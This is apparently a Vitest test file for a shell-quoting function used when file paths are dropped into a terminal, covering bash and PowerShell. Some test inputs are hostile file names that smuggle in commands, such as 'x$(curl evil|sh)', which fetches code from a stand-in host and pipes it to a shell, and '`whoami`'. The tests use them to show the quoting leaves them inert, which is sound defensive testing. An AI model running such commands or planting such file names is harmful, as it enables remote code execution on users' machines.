import { describe, expect, it } from "vitest";
import { quoteForShell } from "./shellQuote";

/**
 * Shell-literal quoting for drag-and-drop path insertion. The security
 * property under test: the quoted string is a LITERAL in both shell
 * families — no substitution, no expansion, no auto-execution — while
 * everyday plain paths stay readable and unquoted.
 */

describe("quoteForShell", () => {
  it("leaves plain paths unquoted (readable, copyable)", () => {
    for (const p of ["src/lib/main.ts", "Cargo.toml", "docs/v1.2-guide.md", "a+b@1.0:2"]) {
      expect(quoteForShell(p, true)).toBe(p);
      expect(quoteForShell(p, false)).toBe(p);
    }
  });

  it("single-quotes paths with spaces", () => {
    expect(quoteForShell("my file.txt", true)).toBe("'my file.txt'");
    expect(quoteForShell("my file.txt", false)).toBe("'my file.txt'");
  });

  it("neutralizes command substitution in filenames (bash shape)", () => {
    // The classic drop-payload attack: a filename that executes when the
    // user presses Enter. Inside single quotes it is inert text.
    expect(quoteForShell("x$(curl evil|sh)", false)).toBe("'x$(curl evil|sh)'");
    expect(quoteForShell("`whoami`", false)).toBe("'`whoami`'");
    expect(quoteForShell("cost $2.txt", false)).toBe("'cost $2.txt'");
  });

  it("neutralizes substitution on pwsh too", () => {
    // pwsh: $(cmd) and $var are inert inside single quotes as well.
    expect(quoteForShell("x$(curl evil|sh)", true)).toBe("'x$(curl evil|sh)'");
    expect(quoteForShell("cost $2.txt", true)).toBe("'cost $2.txt'");
  });

  it("escapes embedded single quotes per shell family", () => {
    // pwsh doubles the quote: 'it''s'
    expect(quoteForShell("it's $1", true)).toBe("'it''s $1'");
    // bash closes and reopens: 'it'\''s $1'
    expect(quoteForShell("it's $1", false)).toBe("'it'\\''s $1'");
  });

  it("round-trips: unquoting yields the original (bash family)", () => {
    const path = "it's `x` $(cmd) $HOME";
    const quoted = quoteForShell(path, false);
    // Eval-free check: reconstruct by stripping the shell escape and
    // the delimiters. 'a'\''b' -> a'b
    const inner = quoted.slice(1, -1);
    expect(inner.replace(/'\\''/g, "'")).toBe(path);
  });
});
